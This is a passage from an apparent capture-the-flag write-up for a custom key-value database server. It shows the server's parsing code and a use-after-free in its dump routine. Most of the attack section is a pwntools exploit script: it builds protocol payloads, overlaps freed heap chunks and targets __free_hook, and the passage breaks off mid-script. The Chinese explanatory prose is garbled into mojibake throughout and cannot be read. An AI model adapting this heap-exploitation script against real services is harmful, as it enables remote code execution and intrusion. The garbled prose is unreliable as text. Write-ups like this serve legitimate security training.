uint32 count_be = <span class="number">0</span>;</span><br><span class="line">    uint32 count_le = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">data_t</span>* item = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    readn(sock, (<span class="keyword">char</span>*)&amp;type_be, <span class="keyword">sizeof</span>(uint16));</span><br><span class="line">    type_le = BigLittleSwap16(type_be);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> l;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (type_le) &#123;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_INTEGER:</span><br><span class="line">            tmp-&gt;type = DATA_TYPE_INTEGER;</span><br><span class="line">            <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;integer_be, <span class="keyword">sizeof</span>(<span class="keyword">data_integer_t</span>)) !=</span><br><span class="line">                <span class="keyword">sizeof</span>(<span class="keyword">data_integer_t</span>)) &#123;</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            &#125;</span><br><span class="line">            tmp-&gt;integer = BigLittleSwap64(integer_be);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Integer: \x1B[36m0x%llx\x1B[0m\n&quot;</span>, tmp-&gt;integer);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_FLOAT:</span><br><span class="line">            tmp-&gt;type = DATA_TYPE_FLOAT;</span><br><span class="line">            <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;float_be, <span class="keyword">sizeof</span>(<span class="keyword">data_float_t</span>)) !=</span><br><span class="line">                <span class="keyword">sizeof</span>(<span class="keyword">data_float_t</span>)) &#123;</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            &#125;</span><br><span class="line">            *(uint64*)&amp;tmp-&gt;_float = BigLittleSwap64(*(uint64*)&amp;float_be);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Float: \x1B[35m%lf\x1B[0m\n&quot;</span>, tmp-&gt;_float);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_STRING:</span><br><span class="line">            tmp-&gt;type = DATA_TYPE_STRING;</span><br><span class="line">            <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;str_len_be, <span class="keyword">sizeof</span>(uint32)) !=</span><br><span class="line">                <span class="keyword">sizeof</span>(uint32)) &#123;</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            &#125;</span><br><span class="line">            str_len_le = BigLittleSwap32(str_len_be);</span><br><span class="line">            tmp-&gt;str.len = str_len_le;</span><br><span class="line">            tmp-&gt;str.ptr = (<span class="keyword">char</span>*)<span class="built_in">calloc</span>(str_len_le, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (!tmp-&gt;str.ptr)</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            readn(sock, tmp-&gt;str.ptr, str_len_le);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;String(%d): \x1B[32m%s\x1B[0m\n&quot;</span>, tmp-&gt;str.len, tmp-&gt;str.ptr);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_ARRAY:</span><br><span class="line">            tmp-&gt;type = DATA_TYPE_ARRAY;</span><br><span class="line">            <span class="keyword">if</span> (readn(sock, (<span class="keyword">char</span>*)&amp;count_be, <span class="keyword">sizeof</span>(uint32)) !=</span><br><span class="line">                <span class="keyword">sizeof</span>(uint32)) &#123;</span><br><span class="line">                <span class="keyword">goto</span> INVALID;</span><br><span class="line">            &#125;</span><br><span class="line">            count_le = BigLittleSwap32(count_be);</span><br><span class="line">            tmp-&gt;<span class="built_in">array</span>.count = count_le;</span><br><span class="line">            tmp-&gt;<span class="built_in">array</span>.items = (<span class="keyword">data_t</span>**)<span class="built_in">calloc</span>(count_le, <span class="keyword">sizeof</span>(<span class="keyword">data_t</span>*));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\x1B[107mArray[%d]\x1B[0m:\n&quot;</span>, tmp-&gt;<span class="built_in">array</span>.count);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">for</span> (uint32 i = <span class="number">0</span>; i &lt; count_le; i++) &#123;</span><br><span class="line">                item = <span class="keyword">do_read_data_t</span>(sock, level + <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> (item == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    <span class="comment">/* release all received items when error occur */</span></span><br><span class="line">                    <span class="keyword">for</span> (uint32 j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                        <span class="keyword">release_data_t</span>(tmp-&gt;<span class="built_in">array</span>.items[j]);</span><br><span class="line">                        <span class="built_in">free</span>(tmp-&gt;<span class="built_in">array</span>.items);</span><br><span class="line">                        <span class="keyword">goto</span> INVALID;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                tmp-&gt;<span class="built_in">array</span>.items[i] = item;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">case</span> DATA_TYPE_EMPTY:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;[%d] &quot;</span>, getpid());</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">0</span>; l &lt; level; l++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;- &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Empty data_t\n&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            tmp-&gt;type = DATA_TYPE_EMPTY;</span><br><span class="line">            <span class="keyword">return</span> tmp;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">goto</span> INVALID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">INVALID:</span><br><span class="line">    <span class="built_in">free</span>(tmp);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x3-æ¼æ´"><a href="#0x3-æ¼æ´" class="headerlink" title="0x3 æ¼æ´"></a>0x3 æ¼æ´</h3><p>æ¼æ´å°±æ˜¯å‡ºåœ¨dumpå‡½æ•°ä¸­çš„<code>dump_data_item()</code>èº«ä¸Šï¼Œä»–å¯¹æ•°æ®åº“çš„å¤åˆ¶å¹¶ä¸æ˜¯æ·±æ‹·è´ï¼Œè€Œæ˜¯ç›´æ¥æŠŠåœ°å€æ‹¿è¿‡æ¥äº†ï¼Œæœ€åè¿˜æŠŠè¿™äº›åœ°å€å…¨éƒ½é€šè¿‡<code>release_data_t()</code>å‡½æ•°é‡Šæ”¾äº†ï¼Œä½†æ˜¯è¿™äº›åœ°å€è¿˜å­˜åœ¨åœ¨æ•°æ®åº“ä¸­ï¼Œæ‰€ä»¥å¯¼è‡´äº†<code>uaf</code>ã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">data_t</span> *<span class="title">dump_data_item</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">data_t</span> *dump_array = (<span class="keyword">data_t</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span>));</span><br><span class="line">    <span class="keyword">if</span>(!dump_array) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    dump_array-&gt;type = DATA_TYPE_ARRAY;</span><br><span class="line">    dump_array-&gt;array.count = database.<span class="built_in">size</span>();</span><br><span class="line">    dump_array-&gt;array.items = (<span class="keyword">data_t</span> **)<span class="built_in">calloc</span>(dump_array-&gt;array.count, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span> *));</span><br><span class="line">    std::list&lt;kvpair&gt;::iterator iter;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (iter = database.<span class="built_in">begin</span>(), i = <span class="number">0</span>; iter != database.<span class="built_in">end</span>(); iter++, i++) &#123;</span><br><span class="line">        <span class="comment">/* item_array[2] = &#123;key, value&#125; */</span></span><br><span class="line">        <span class="keyword">data_t</span> *item_array = (<span class="keyword">data_t</span> *)<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span>));</span><br><span class="line">        item_array-&gt;type = DATA_TYPE_ARRAY;</span><br><span class="line">        item_array-&gt;array.count = <span class="number">2</span>;</span><br><span class="line">        item_array-&gt;array.items = (<span class="keyword">data_t</span> **)<span class="built_in">calloc</span>(<span class="number">2</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">data_t</span> *));</span><br><span class="line">        item_array-&gt;array.items[<span class="number">0</span>] = iter-&gt;first.<span class="built_in">get_data_t</span>();</span><br><span class="line">        item_array-&gt;array.items[<span class="number">1</span>] = iter-&gt;second.<span class="built_in">get_data_t</span>();</span><br><span class="line">        dump_array-&gt;array.items[i] = item_array;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dump_array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x4-æ¼æ´åˆ©ç”¨"><a href="#0x4-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x4 æ¼æ´åˆ©ç”¨"></a>0x4 æ¼æ´åˆ©ç”¨</h3><p>è¿™ä¸ªç¨‹åºè§‰å¾—æœ€éš¾çš„ä¸æ˜¯å‘ç°æ¼æ´ï¼Œè€Œæ˜¯å‘ç°æ¼æ´åè¯¥å¦‚ä½•åˆ©ç”¨æ¼æ´ï¼ŒæˆåŠŸå‘ç°æ¼æ´åˆ°åˆ©ç”¨æˆåŠŸåˆèŠ±äº†ä¸€å¤©ï¼Œç”±äºkeyå’Œvalueçš„å‰å…«ä¸ªå­—èŠ‚æ”¾çš„æ˜¯ä»–çš„ç±»å‹ï¼Œå¦‚æœè¢«freeçš„è¯å°±ä¼šç ´åï¼Œä½†æ˜¯å¦‚æœå†æ¬¡è®¿é—®çš„è¯å°±è®¿é—®ä¸åˆ°äº†ï¼Œåˆšå¼€å§‹çš„æ€è·¯æ˜¯è®©freeæ‰çš„å †è¢«unlinkå°±å¥½äº†ï¼Œä½†æ˜¯è¯•äº†ä¸€ä¼šå‘ç°0x20å¤§å°çš„å †æ ¹æœ¬ä¸ä¼šunlink,æ‰€ä»¥æ²¡åŠæ³•freeå®Œä¹‹åç«‹å³ä½¿ç”¨</p>
<p>æ­£ç¡®çš„æ€è·¯å°±æ˜¯ç›´æ¥å†ç”³è¯·è¢«freeæ‰çš„å †å—ï¼Œè¿™æ ·å°±æœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€å—åŒºåŸŸäº†ï¼Œç„¶ååœ¨ç”³è¯·çš„æ—¶å€™ç”³è¯·stringçš„value,å°±å¯ä»¥åˆ©ç”¨stringæ§åˆ¶èŠ‚ç‚¹äº†ã€‚è¿™æ˜¯ä¸ªæ¦‚ç‡äº‹ä»¶ï¼Œå¾—å¤šæ¬¡é‡å¤çš„ç”³è¯·æ‰å¯èƒ½æˆåŠŸã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#add_int_string</span></span><br><span class="line">payload=add_int_string(<span class="number">0x10</span>,<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x20</span>,<span class="number">0x40</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x30</span>,<span class="number">0x40</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x40</span>,<span class="number">0x40</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x50</span>,<span class="number">0x40</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x60</span>,<span class="number">0x40</span>,<span class="string">&#x27;f&#x27;</span>)</span><br><span class="line"><span class="comment">#dump</span></span><br><span class="line">payload+=dump()</span><br><span class="line"><span class="comment">#add_string_string</span></span><br><span class="line">payload+=add_int_string(<span class="number">0x70</span>,<span class="number">0x16</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x80</span>,<span class="number">0x16</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0x90</span>,<span class="number">0x16</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0xa0</span>,<span class="number">0x16</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0xb0</span>,<span class="number">0x16</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">payload+=add_int_string(<span class="number">0xc0</span>,<span class="number">0x16</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x16</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·ä»¥åå †å—çš„å †å æƒ…å†µæ˜¯è¿™æ ·çš„</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">è¿™æ˜¯æ¯ä¸€ä¸ªé”®å€¼å¯¹çš„å †å—çš„å12ä½</span></span><br><span class="line">1:0a0 0c0</span><br><span class="line">2:310 330</span><br><span class="line">3:4c0 4e0</span><br><span class="line">4:5d0 5f0</span><br><span class="line">5:690 6b0</span><br><span class="line">6:750 770</span><br><span class="line"><span class="meta">#</span><span class="bash">å†ç”³è¯·å</span></span><br><span class="line">0x70 string-&gt;0x80 value</span><br><span class="line">0xa0 string-&gt;310</span><br><span class="line">0xb0 string-&gt;0c0</span><br><span class="line">0xc0 value -&gt;0c0</span><br></pre></td></tr></table></figure>

<p>å¯è§æˆ‘ä»¬å¯ä»¥æ§åˆ¶3ä¸ªèŠ‚ç‚¹äº†ï¼Œåˆ©ç”¨è¿™ä¸‰ä¸ªèŠ‚ç‚¹å®Œæˆå¯¹<code>__free_hook</code>çš„æ”¹å†™ï¼Œç„¶ååå¼¹flagï¼Œå‡ºé¢˜äººè¯´ä¸è¿å¤–ç½‘ï¼Œæ‰€ä»¥ç›´æ¥é€šè¿‡sokcetæŠŠflagåå¼¹å›æ¥</p>
<p>å®Œæ•´è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="number">9998</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=remote(ip,port)</span></span><br><span class="line">sh=remote(<span class="string">&quot;pwn.archive.xdsec.chall.frankli.site&quot;</span>,<span class="number">10088</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">op_buf=&#123;</span><br><span class="line">    <span class="number">1</span>:<span class="string">b&quot;ADD&quot;</span>,</span><br><span class="line">    <span class="number">2</span>:<span class="string">b&quot;DEL&quot;</span>,</span><br><span class="line">    <span class="number">3</span>:<span class="string">b&quot;MDF&quot;</span>,</span><br><span class="line">    <span class="number">4</span>:<span class="string">b&quot;RNM&quot;</span>,</span><br><span class="line">    <span class="number">5</span>:<span class="string">b&quot;CPY&quot;</span>,</span><br><span class="line">    <span class="number">6</span>:<span class="string">b&quot;GET&quot;</span>,</span><br><span class="line">    <span class="number">7</span>:<span class="string">b&quot;DUM&quot;</span>,</span><br><span class="line">    <span class="number">8</span>:<span class="string">b&quot;CLR&quot;</span>,</span><br><span class="line">    <span class="number">9</span>:<span class="string">b&quot;SHUT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_int</span>(<span class="params">digit</span>):</span></span><br><span class="line">    pay=p16(<span class="number">0x0100</span>)+p64(digit)</span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_string</span>(<span class="params">str_len,str_srt</span>):</span></span><br><span class="line">    strlen=((str_len&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>)|((str_len&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">8</span>)|((str_len&amp;<span class="number">0x0000ff00</span>)&lt;&lt;<span class="number">8</span>)|((str_len&amp;<span class="number">0x000000ff</span>)&lt;&lt;<span class="number">24</span>)</span><br><span class="line">    pay=p16(<span class="number">0x0300</span>)+p32(strlen)</span><br><span class="line">    pay+=<span class="built_in">bytes</span>(str_srt.ljust(str_len,<span class="string">&#x27;\x00&#x27;</span>),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_string1</span>(<span class="params">str_len,str_srt</span>):</span></span><br><span class="line">    strlen=((str_len&amp;<span class="number">0xff000000</span>)&gt;&gt;<span class="number">24</span>)|((str_len&amp;<span class="number">0x00ff0000</span>)&gt;&gt;<span class="number">8</span>)|((str_len&amp;<span class="number">0x0000ff00</span>)&lt;&lt;<span class="number">8</span>)|((str_len&amp;<span class="number">0x000000ff</span>)&lt;&lt;<span class="number">24</span>)</span><br><span class="line">    pay=p16(<span class="number">0x0300</span>)+p32(strlen)</span><br><span class="line">    pay+=str_srt</span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msg</span>(<span class="params">code,context</span>):</span></span><br><span class="line">    pay=<span class="string">b&#x27;KVDB&#x27;</span>+p16(<span class="number">0x0300</span>)+op_buf[code]</span><br><span class="line">    <span class="keyword">if</span>(context!=<span class="string">b&#x27;&#x27;</span>):</span><br><span class="line">        pay+=context</span><br><span class="line">    <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_int_string</span>(<span class="params">key_value,value_len,content</span>):</span></span><br><span class="line">    pay=build_int(key_value)</span><br><span class="line">    pay+=build_string(value_len,content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">1</span>,pay)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>():</span></span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">7</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear</span>():</span></span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">8</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_string_string</span>(<span class="params">key_len,key_content,value_len,value_content</span>):</span></span><br><span class="line">    pay=build_string(key_len,key_content)</span><br><span class="line">    pay+=build_string(value_len,value_content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">1</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_string_key</span>(<span class="params">key_len,key_content</span>):</span></span><br><span class="line">    pay=build_string(key_len,key_content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">2</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stringkey_get_value</span>(<span class="params">key_len,key_value</span>):</span></span><br><span class="line">    pay=build_string(key_len,key_value)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">6</span>,pay)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">intkey_get_value</span>(<span class="params">key_value</span>):</span></span><br><span class="line">    pay=build_int(key_value)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">6</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_int_key</span>(<span class="params">key_value</span>):</span></span><br><span class="line">    pay=build_int(key_value)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">2</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_value</span>(<span class="params">key_value,value_len,value_content</span>):</span></span><br><span class="line">    pay=build_int(key_value)</span><br><span class="line">    pay+=build_string1(value_len,value_content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">3</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_key</span>(<span class="params">key_len,key_content,new_len,new_content</span>):</span></span><br><span class="line">    pay=build_string1(key_len,key_content)</span><br><span class="line">    pay+=build_string1(new_len,new_content)</span><br><span class="line">    <span class="keyword">return</span> msg(<span class="number">4</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment">#add_int_string</span></span><br><span class="line">    payload=add_int_string(<span class="number">0x10</span>,<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x20</span>,<span class="number">0x40</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x30</span>,<span class="number">0x40</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x40</span>,<span class="number">0x40</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x50</span>,<span class="number">0x40</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x60</span>,<span class="number">0x40</span>,<span class="string">&#x27;f&#x27;</span>)</span><br><span class="line">    <span class="comment">#dump</span></span><br><span class="line">    payload+=dump()</span><br><span class="line">    <span class="comment">#add_string_string</span></span><br><span class="line">    payload+=add_int_string(<span class="number">0x70</span>,<span class="number">0x16</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x80</span>,<span class="number">0x16</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0x90</span>,<span class="number">0x16</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0xa0</span>,<span class="number">0x16</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0xb0</span>,<span class="number">0x16</span>,<span class="string">&#x27;e&#x27;</span>*<span 